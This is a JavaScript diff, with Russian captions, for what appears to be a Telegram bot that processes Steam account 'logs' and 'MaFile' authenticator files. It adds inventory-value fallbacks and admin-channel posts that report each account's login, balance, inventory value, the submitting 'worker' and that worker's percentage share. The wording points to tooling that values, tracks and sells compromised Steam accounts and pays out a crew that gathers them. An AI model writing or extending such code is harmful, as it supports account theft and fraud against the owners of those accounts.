@@ -48,9 +48,18 @@ function accountBalanceUsd(account) {
   return 0;
 }
 
+/** Как на панели: tradable (иначе marketable / total). Не accountPrice — там копия баланса. */
 function accountInventoryUsd(account) {
-  const total = account?.inventory?.price?.total ?? account?.accountPrice ?? 0;
-  return Math.max(0, Number(total) || 0);
+  const price = account?.inventory?.price || {};
+  const raw =
+    price.tradable != null
+      ? price.tradable
+      : price.marketable != null
+        ? price.marketable
+        : price.total != null
+          ? price.total
+          : 0;
+  return Math.max(0, Number(raw) || 0);
 }
 
 /** Общая сумма лога = баланс + цена инвентаря. */
@@ -276,6 +285,40 @@ async function postProfitChannel(bot, { imageBuffer, total, ownerTelegramId }) {
   );
 }
 
+function inventoryPriceUsd(priceObj, fallback = 0) {
+  const price = priceObj || {};
+  const raw =
+    price.tradable != null
+      ? price.tradable
+      : price.marketable != null
+        ? price.marketable
+        : price.total != null
+          ? price.total
+          : fallback;
+  return Math.max(0, Number(raw) || 0);
+}
+
+async function postAdminLogsChannel(bot, { imageBuffer, filename, caption }) {
+  if (!env.steamAdminLogsChannelId) return null;
+  try {
+    return await bot.telegram.sendPhoto(
+      env.steamAdminLogsChannelId,
+      Input.fromBuffer(imageBuffer, filename),
+      { caption, parse_mode: "HTML" }
+    );
+  } catch (error) {
+    logger.warn("Admin logs channel post failed", error?.response?.description || error.message);
+    return null;
+  }
+}
+
+async function buildAdminChannelOwnerLabel(ownerTelegramId) {
+  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
+  if (!user) return ownerTelegramId ? `<code>${ownerTelegramId}</code>` : "—";
+  if (user.isAnonymous) return `<code>${user.telegramId}</code>`;
+  return user.username ? `@${user.username}` : `<code>${user.telegramId}</code>`;
+}
+
 async function processValidLog(bot, log, account) {
   const imageBuffer = await renderSteamLogImage(account);
   const snap = snapshotAccountFields(account);
@@ -288,6 +331,23 @@ async function processValidLog(bot, log, account) {
     { reply_markup: steamLogSellKeyboard(log.sourceId).reply_markup }
   );
   if (dm) await pinDmMessage(bot, log.ownerTelegramId, dm.message_id);
+
+  const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
+  const login = String(account?.username || account?.steamInfo?.nickname || log.sourceId);
+  await postAdminLogsChannel(bot, {
+    imageBuffer,
+    filename: `steam-log-${log.sourceId}.png`,
+    caption: [
+      `${pe("package")} <b>Новый лог</b> · Валид`,
+      `${pe("profile")} Воркер: ${ownerLabel}`,
+      `${pe("tag")} Логин: <code>${login}</code>`,
+      `${pe("coins")} Общая сумма: <b>${formatLogTotalUsd(snap.totalProfit)}</b>`,
+      `└ Баланс: ${formatLogTotalUsd(snap.balanceUsd)}`,
+      `└ Инвентарь: ${formatLogTotalUsd(snap.inventoryUsd)}`,
+      `${pe("file")} ID: <code>${log.sourceId}</code>`,
+    ].join("\n"),
+  });
+
   Object.assign(log, {
     status: "processed",
     logKind: "valid",
@@ -301,14 +361,14 @@ async function processValidLog(bot, log, account) {
 async function processMaFileLog(bot, log, account) {
   const steamId = String(account?.steamInfo?.steamid || log.sourceId);
   let inventory = null;
-  let total = Number(account?.inventory?.price?.total || 0);
+  let total = inventoryPriceUsd(account?.inventory?.price, 0);
   try {
     const task = await createCheckValidTask(account.id || log.sourceId);
     const result = task?.id ? await waitTaskDone(task.id) : task;
     if (result?.state === "Done") {
       const sid = String(result?.steam?.steamid || result?.result?.steam?.steamid || steamId);
       inventory = await getSteamInventory(sid);
-      total = Number(inventory?.price?.total || total);
+      total = inventoryPriceUsd(inventory?.price, total);
       log.steamId = sid;
     }
   } catch (error) {
@@ -339,6 +399,21 @@ async function processMaFileLog(bot, log, account) {
     logger.warn("MaFile channel post failed", error.message);
   }
 
+  const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
+  const login = String(account?.username || account?.steamInfo?.nickname || log.sourceId);
+  await postAdminLogsChannel(bot, {
+    imageBuffer,
+    filename: `steam-mafile-${log.sourceId}.png`,
+    caption: [
+      `${pe("gift")} <b>Новый MaFile</b>`,
+      `${pe("profile")} Воркер: ${ownerLabel}`,
+      `${pe("tag")} Логин: <code>${login}</code>`,
+      `${pe("coins")} Инвентарь: <b>$${total.toFixed(2)}</b>`,
+      `└ Доля воркера: $${workerShare.toFixed(2)} (${env.steamWorkerPercent}%)`,
+      `${pe("file")} ID: <code>${log.sourceId}</code>`,
+    ].join("\n"),
+  });
+
   Object.assign(log, {
     status: "processed",
     logKind: "mafile",
@@ -362,7 +437,7 @@ async function processAccountLog(bot, log, account) {
         status: "processed",
         logKind: kind,
         steamId: String(account?.steamInfo?.steamid || ""),
-        totalProfit: Number(account?.inventory?.price?.total || 0),
+        totalProfit: inventoryPriceUsd(account?.inventory?.price, 0),
         errorMessage: "",
       });
     }
